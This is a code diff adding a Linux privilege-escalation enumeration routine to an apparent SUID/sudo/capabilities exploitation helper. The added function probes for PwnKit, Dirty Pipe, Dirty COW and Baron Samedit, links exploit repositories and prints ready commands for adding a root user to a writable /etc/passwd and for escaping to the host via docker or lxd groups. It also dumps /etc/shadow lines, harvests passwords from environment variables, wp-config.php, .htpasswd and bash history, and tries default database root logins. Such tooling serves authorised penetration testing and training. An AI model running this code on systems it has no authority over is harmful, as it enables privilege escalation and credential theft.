@@ -659,6 +659,370 @@ def process_capabilities(cap_binaries, exam_mode=False):
 # AUTO-RUN MODE
 # ============================================================================
 
+# ============================================================================
+# LINENUM-NG STYLE ENUMERATION
+# ============================================================================
+
+def run_enum(args):
+    """Run LinEnum-ng style enumeration checks after SUID/sudo/cap analysis."""
+    import subprocess
+    import platform
+
+    SEP = "=" * 60
+    SUBSEP = "-" * 60
+
+    def header(title):
+        print(f"\n{c(BOLD, SEP)}")
+        print(c(BOLD, f" {title}"))
+        print(c(BOLD, SEP))
+
+    def info(label, value=""):
+        if value:
+            print(f"  {label}: {c(GREEN, value)}")
+        else:
+            print(f"  {label}")
+
+    def critical(msg):
+        print(f"  {c(PRIORITY_COLORS[1], '[!!!] ' + msg)}")
+
+    def warn(msg):
+        print(f"  {c(PRIORITY_COLORS[2], '[!] ' + msg)}")
+
+    def cmd(command, timeout=15):
+        """Run a command and return stdout."""
+        try:
+            r = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
+            return r.stdout.strip()
+        except Exception:
+            return ""
+
+    # ─── SYSTEM INFO ─────────────────────────────────────────────
+    header("SYSTEM INFORMATION")
+    info("Hostname", cmd("hostname"))
+    info("Kernel", cmd("uname -r"))
+    info("OS", cmd("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'\"' -f2"))
+    info("Architecture", cmd("uname -m"))
+    info("Current user", cmd("id"))
+
+    # ─── KERNEL CVE CHECK ────────────────────────────────────────
+    header("KERNEL CVE CHECK")
+    kernel = cmd("uname -r")
+    kparts = kernel.split("-")[0].split(".")
+    v1, v2, v3 = int(kparts[0]) if len(kparts) > 0 else 0, int(kparts[1]) if len(kparts) > 1 else 0, int(kparts[2]) if len(kparts) > 2 else 0
+
+    # PwnKit
+    pkexec_ver = cmd("pkexec --version 2>/dev/null | grep -oP '[0-9]+\\.[0-9]+'")
+    if pkexec_ver:
+        try:
+            if float(pkexec_ver) < 0.120 and cmd("find /usr/bin/pkexec -perm -4000 2>/dev/null"):
+                critical(f"CVE-2021-4034 PwnKit — pkexec {pkexec_ver} < 0.120 + SUID")
+                info("  Exploit: https://github.com/ly4k/PwnKit")
+            else:
+                info("PwnKit: Not vulnerable")
+        except ValueError:
+            pass
+    else:
+        info("PwnKit: pkexec not found")
+
+    # Dirty Pipe
+    if v1 == 5 and 8 <= v2 <= 16:
+        if not (v2 == 16 and v3 >= 11):
+            critical(f"CVE-2022-0847 Dirty Pipe — kernel {kernel}")
+            info("  Exploit: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit")
+        else:
+            info("Dirty Pipe: Not vulnerable (patched)")
+    else:
+        info("Dirty Pipe: Not vulnerable")
+
+    # Dirty COW
+    if v1 < 4 or (v1 == 4 and v2 < 9):
+        if v1 < 3 or (v1 == 3 and v2 <= 19) or (v1 == 4 and v2 < 9):
+            critical(f"CVE-2016-5195 Dirty COW possible — kernel {kernel}")
+            info("  Exploit: gcc -pthread dirty.c -o dirty -lcrypt")
+    else:
+        info("Dirty COW: Not vulnerable")
+
+    # Baron Samedit
+    sudo_ver = cmd("sudo -V 2>/dev/null | head -1 | grep -oP '[0-9]+\\.[0-9]+\\.[0-9p]+'")
+    if sudo_ver:
+        test = cmd("sudoedit -s '\\' $(python3 -c \"print('A'*100)\") 2>&1 | grep -c 'not a regular file'")
+        if test == "1":
+            critical(f"CVE-2021-3156 Baron Samedit — sudo {sudo_ver}")
+            info("  Exploit: https://github.com/blasty/CVE-2021-3156")
+        else:
+            info(f"Baron Samedit: sudo {sudo_ver} — not vulnerable or patched")
+
+    # Sudo CVEs
+    if sudo_ver:
+        # CVE-2019-18634
+        s_parts = sudo_ver.replace("p", ".").split(".")
+        try:
+            if len(s_parts) >= 3 and int(s_parts[0]) == 1 and int(s_parts[1]) == 8 and int(s_parts[2]) < 26:
+                warn(f"CVE-2019-18634 (pwfeedback) — sudo {sudo_ver}")
+        except ValueError:
+            pass
+
+    # Compilers available
+    compilers = []
+    for comp in ["gcc", "cc", "g++", "make", "python3", "perl"]:
+        if cmd(f"which {comp} 2>/dev/null"):
+            compilers.append(comp)
+    if compilers:
+        info("Compilers/Interpreters", ", ".join(compilers))
+
+    # ─── USER / GROUP ────────────────────────────────────────────
+    header("USER / GROUP / PERMISSIONS")
+
+    # Writable /etc/passwd
+    if cmd("test -w /etc/passwd && echo yes"):
+        critical("/etc/passwd is WRITABLE — can add root user!")
+        info("  openssl passwd -1 -salt hacker password123")
+        info("  echo 'hacker:HASH:0:0::/root:/bin/bash' >> /etc/passwd")
+    else:
+        info("/etc/passwd: not writable")
+
+    # Readable /etc/shadow
+    if cmd("test -r /etc/shadow && echo yes"):
+        critical("/etc/shadow is READABLE — crack hashes!")
+        shadow_top = cmd("head -3 /etc/shadow 2>/dev/null")
+        if shadow_top:
+            for line in shadow_top.split("\n"):
+                info(f"  {line}")
+    else:
+        info("/etc/shadow: not readable")
+
+    # Hashes in /etc/passwd
+    hashes = cmd("grep -v '^[^:]*:[x*]' /etc/passwd 2>/dev/null | grep -v '^#'")
+    if hashes:
+        critical("Password hashes in /etc/passwd!")
+        for line in hashes.split("\n")[:3]:
+            info(f"  {line}")
+
+    # Interesting groups
+    my_groups = cmd("id")
+    for g in ["docker", "lxd", "lxc", "disk", "adm", "shadow", "video"]:
+        if g in my_groups:
+            critical(f"Current user is in '{g}' group!")
+            if g == "docker":
+                info("  docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
+            elif g in ("lxd", "lxc"):
+                info("  lxc init IMAGE privesc -c security.privileged=true")
+                info("  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true")
+            elif g == "disk":
+                info("  debugfs /dev/sda1 → cat /etc/shadow")
+
+    # Users with login shells
+    users = cmd("grep -E '(/bin/bash|/bin/sh|/bin/zsh|/bin/fish)' /etc/passwd 2>/dev/null | cut -d: -f1")
+    if users:
+        info("Login shell users", users.replace("\n", ", "))
+
+    # ─── ENVIRONMENT ─────────────────────────────────────────────
+    header("ENVIRONMENT")
+
+    # Writable PATH dirs
+    path_dirs = os.environ.get("PATH", "").split(":")
+    writable_paths = [d for d in path_dirs if os.path.isdir(d) and os.access(d, os.W_OK)]
+    if writable_paths:
+        critical("Writable PATH directories — path hijacking possible!")
+        for d in writable_paths:
+            info(f"  {d}")
+    else:
+        info("PATH: no writable directories")
+
+    # Sensitive env vars
+    sensitive = cmd("env 2>/dev/null | grep -iE 'pass|pwd|key|secret|token|api' | grep -v '_=/'")
+    if sensitive:
+        warn("Sensitive environment variables found:")
+        for line in sensitive.split("\n")[:5]:
+            info(f"  {line}")
+
+    # ─── CRON / TIMERS ───────────────────────────────────────────
+    header("CRON & SCHEDULED TASKS")
+
+    crontab = cmd("cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$'")
+    if crontab:
+        info("System crontab:")
+        for line in crontab.split("\n"):
+            info(f"  {line}")
+
+    # Writable cron files
+    ww_cron = cmd("find /etc/cron* -perm -0002 -type f 2>/dev/null")
+    if ww_cron:
+        critical("World-writable cron files!")
+        for line in ww_cron.split("\n"):
+            info(f"  {line}")
+
+    # Writable cron dirs
+    ww_cron_dirs = cmd("find /etc/cron* -type d -writable 2>/dev/null")
+    if ww_cron_dirs:
+        critical("Writable cron directories!")
+        for line in ww_cron_dirs.split("\n"):
+            info(f"  {line}")
+
+    # Systemd timers
+    timers = cmd("systemctl list-timers --no-pager 2>/dev/null | head -15")
+    if timers:
+        info("Systemd timers:")
+        for line in timers.split("\n")[:10]:
+            info(f"  {line}")
+
+    # ─── NETWORK ─────────────────────────────────────────────────
+    header("NETWORK")
+
+    # Listening ports
+    ports = cmd("ss -tunlp 2>/dev/null | grep LISTEN") or cmd("netstat -tunlp 2>/dev/null | grep LISTEN")
+    if ports:
+        info("Listening services:")
+        for line in ports.split("\n")[:15]:
+            info(f"  {line}")
+
+    # ─── INTERESTING FILES ───────────────────────────────────────
+    header("INTERESTING FILES")
+
+    # SSH keys
+    ssh_keys = cmd("find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -10")
+    if ssh_keys:
+        critical("SSH private keys found!")
+        for key in ssh_keys.split("\n"):
+            readable = " [READABLE]" if cmd(f"test -r '{key}' && echo yes") else ""
+            info(f"  {key}{readable}")
+
+    # Writable authorized_keys
+    auth_keys = cmd("find / -name authorized_keys -writable 2>/dev/null | head -5")
+    if auth_keys:
+        critical("Writable authorized_keys files!")
+        for f in auth_keys.split("\n"):
+            info(f"  {f}")
+
+    # Readable /root
+    if cmd("test -r /root && echo yes"):
+        critical("/root is readable!")
+        info("  " + cmd("ls /root 2>/dev/null | head -5").replace("\n", ", "))
+
+    # Hidden files owned by current user in /home
+    me = cmd("whoami")
+    hidden = cmd(f"find /home /opt /tmp /var -name '.*' -type f -user {me} 2>/dev/null | head -15")
+    if hidden:
+        info("Hidden files owned by you:")
+        for f in hidden.split("\n"):
+            info(f"  {f}")
+
+    # Backup files
+    backups = cmd("find / -type f \\( -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*.orig' \\) 2>/dev/null | grep -v '/usr/' | head -10")
+    if backups:
+        warn("Backup files found:")
+        for f in backups.split("\n"):
+            info(f"  {f}")
+
+    # ─── PASSWORD HUNTING ────────────────────────────────────────
+    header("PASSWORD HUNTING")
+
+    # Config files with passwords
+    pw_hits = cmd("grep -rlI --include='*.conf' --include='*.config' --include='*.ini' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.xml' --include='*.php' --include='*.py' 'password\\|passwd\\|pwd' /var/www /opt /etc 2>/dev/null | grep -v '/usr/' | head -10")
+    if pw_hits:
+        warn("Files containing password strings:")
+        for f in pw_hits.split("\n"):
+            info(f"  {f}")
+
+    # WordPress
+    wp = cmd("find / -name wp-config.php -readable 2>/dev/null | head -3")
+    if wp:
+        critical("Readable wp-config.php found!")
+        for f in wp.split("\n"):
+            info(f"  {f}")
+            creds = cmd(f"grep -E 'DB_USER|DB_PASSWORD' '{f}' 2>/dev/null")
+            if creds:
+                for line in creds.split("\n"):
+                    info(f"    {line.strip()}")
+
+    # .git-credentials
+    gitcreds = cmd("find / -name .git-credentials -readable 2>/dev/null | head -3")
+    if gitcreds:
+        critical(".git-credentials found!")
+        for f in gitcreds.split("\n"):
+            info(f"  {f}")
+
+    # htpasswd
+    htpw = cmd("find / -name .htpasswd -readable 2>/dev/null | head -3")
+    if htpw:
+        critical(".htpasswd files found!")
+        for f in htpw.split("\n"):
+            info(f"  {f}")
+            info(f"    {cmd(f'head -2 {f} 2>/dev/null')}")
+
+    # Bash history
+    histories = cmd("find /home /root -name '.bash_history' -readable 2>/dev/null | head -5")
+    if histories:
+        warn("Readable bash history:")
+        for f in histories.split("\n"):
+            info(f"  {f}")
+            interesting = cmd(f"grep -iE 'pass|ssh|mysql|su |sudo|token|secret|curl.*-u' '{f}' 2>/dev/null | tail -5")
+            if interesting:
+                for line in interesting.split("\n"):
+                    info(f"    {line}")
+
+    # ─── WRITABLE LOCATIONS ──────────────────────────────────────
+    header("WRITABLE FILES & DIRS")
+
+    # Writable /etc files
+    ww_etc = cmd("find /etc -writable -type f 2>/dev/null | grep -v '/proc' | head -10")
+    if ww_etc:
+        warn("Writable files in /etc:")
+        for f in ww_etc.split("\n"):
+            info(f"  {f}")
+
+    # Writable service files
+    ww_svc = cmd("find /etc/systemd /lib/systemd -writable -type f 2>/dev/null | head -5")
+    if ww_svc:
+        critical("Writable systemd service files!")
+        for f in ww_svc.split("\n"):
+            info(f"  {f}")
+
+    # ─── SERVICES ────────────────────────────────────────────────
+    header("RUNNING SERVICES (as root)")
+    root_procs = cmd("ps aux 2>/dev/null | grep '^root' | grep -vE 'kthread|\\[' | head -15")
+    if root_procs:
+        for line in root_procs.split("\n"):
+            info(f"  {line[:120]}")
+
+    # ─── DATABASE ────────────────────────────────────────────────
+    header("DATABASE")
+    # MySQL no-pass
+    if cmd("which mysql 2>/dev/null"):
+        if cmd("mysqladmin -uroot version 2>/dev/null"):
+            critical("MySQL root has NO PASSWORD!")
+        elif cmd("mysqladmin -uroot -proot version 2>/dev/null"):
+            critical("MySQL root password is 'root'!")
+        else:
+            info("MySQL: default creds failed")
+    # PostgreSQL
+    if cmd("which psql 2>/dev/null"):
+        if cmd("psql -U postgres -w -c 'SELECT 1' template1 2>/dev/null"):
+            critical("PostgreSQL postgres user has NO PASSWORD!")
+        else:
+            info("PostgreSQL: no-password login failed")
+
+    # ─── NFS / FSTAB ────────────────────────────────────────────
+    header("NFS & MOUNTS")
+    exports = cmd("cat /etc/exports 2>/dev/null | grep -v '^#' | grep -v '^$'")
+    if exports:
+        warn("NFS exports found:")
+        for line in exports.split("\n"):
+            info(f"  {line}")
+            if "no_root_squash" in line:
+                critical("  ^ no_root_squash — mount and create SUID binary!")
+
+    fstab_creds = cmd("grep -iE 'username|password|cred' /etc/fstab 2>/dev/null")
+    if fstab_creds:
+        critical("Credentials in /etc/fstab!")
+        for line in fstab_creds.split("\n"):
+            info(f"  {line}")
+
+    print(f"\n{c(BOLD, SEP)}")
+    print(c(BOLD, " ENUMERATION COMPLETE"))
+    print(c(BOLD, SEP))
+
+
 def run_auto(args):
     """Auto-run SUID + sudo + capabilities checks."""
     import subprocess
@@ -746,6 +1110,10 @@ def run_auto(args):
             reads = sum(1 for r in all_results if r["function"] == "file_read")
             print(f"\n[*] Summary: {len(all_results)} findings | {shells} shells | {reads} file reads")
 
+    # Run LinEnum-ng style enumeration
+    if not args.json and not args.no_enum:
+        run_enum(args)
+
     return 0 if all_results else 1
 
 
@@ -800,6 +1168,10 @@ def main():
                        help="Suppress banner")
     parser.add_argument("--no-color", action="store_true",
                        help="Disable colors")
+    parser.add_argument("--no-enum", action="store_true",
+                       help="Skip LinEnum-ng enumeration (only SUID/sudo/cap)")
+    parser.add_argument("--enum-only", action="store_true",
+                       help="Run ONLY LinEnum-ng enumeration (skip SUID/sudo/cap)")
 
     args = parser.parse_args()
 
@@ -822,6 +1194,11 @@ def main():
     # Quick single check mode
     if args.check:
         return handle_single_check(args)
+
+    # Enum-only mode
+    if args.enum_only:
+        run_enum(args)
+        return 0
 
     # Read input
     if is_pipe():
